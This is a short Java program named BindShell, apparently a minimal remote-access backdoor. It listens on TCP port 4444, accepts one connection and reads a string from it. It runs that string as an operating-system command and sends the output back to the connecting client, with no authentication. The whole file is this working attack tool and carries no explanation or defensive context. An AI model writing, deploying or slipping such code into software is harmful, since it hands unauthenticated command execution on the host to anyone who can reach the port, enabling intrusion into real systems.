import java.io.*;
import java.net.*;

public class BindShell
{
    public static void main(String args[])
    {
        try
        {

            ServerSocket serv = new ServerSocket(4444);

            Socket s = serv.accept();

            DataInputStream dis = new DataInputStream(s.getInputStream());

            String command = (String)dis.readUTF();

            System.out.println("Recieved String=" + command);

            Process p = Runtime.getRuntime().exec(command);

            String tmp = null;

            BufferedReader stdio = new BufferedReader(new InputStreamReader(p.getInputStream()));

            OutputStream clientOutput = s.getOutputStream();
            PrintWriter writer = new PrintWriter(clientOutput, true);

            while ((tmp = stdio.readLine()) != null)
            {
                writer.println(tmp);
            }
            
            s.close();
            serv.close();

            System.exit(0);
        }
        catch (IOException e)
        {
            e.printStackTrace();
            return;
        }
    }
}

